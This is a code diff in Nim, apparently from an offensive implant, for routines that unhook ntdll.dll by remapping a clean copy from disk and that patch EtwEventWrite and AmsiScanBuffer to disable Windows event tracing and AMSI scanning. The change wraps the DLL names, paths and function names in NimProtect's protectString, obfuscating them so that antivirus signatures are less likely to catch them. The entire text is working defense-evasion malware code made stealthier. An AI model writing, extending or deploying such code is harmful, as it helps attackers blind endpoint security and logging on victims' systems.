@@ -2,7 +2,7 @@ import helpers
 import winim
 import dynlib
 import strutils
-
+import NimProtect
 
 proc unhook_ntdll*(): bool =
 
@@ -12,7 +12,7 @@ proc unhook_ntdll*(): bool =
   var 
       processH = GetCurrentProcess()
       mi : MODULEINFO
-      ntdllModule = GetModuleHandleA("ntdll.dll")
+      ntdllModule = GetModuleHandleA(protectString("ntdll.dll"))
       ntdllBase : LPVOID
       ntdllFile : FileHandle
       ntdllMapping : HANDLE
@@ -23,7 +23,7 @@ proc unhook_ntdll*(): bool =
 
   GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
   ntdllBase = mi.lpBaseOfDll
-  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
+  ntdllFile = getOsFileHandle(open(protectString("C:\\windows\\system32\\ntdll.dll"),fmRead))
   ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL)
   if ntdllMapping != 0:
     ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
@@ -59,12 +59,12 @@ proc patch_func*(command_name: string): bool =
         t: DWORD
 
     case command_name:
-        of "etw":
-            dll_name = "ntdll"
-            func_name = "EtwEventWrite"
-        of "amsi":
-            dll_name = "amsi"
-            func_name = "AmsiScanBuffer"
+        of protectString("etw"):
+            dll_name = protectString("ntdll")
+            func_name = protectString("EtwEventWrite")
+        of protectString("amsi"):
+            dll_name = protectString("amsi")
+            func_name = protectString("AmsiScanBuffer")
 
     dll_h = loadLib(dll_name)
     if not isNil(dll_h):
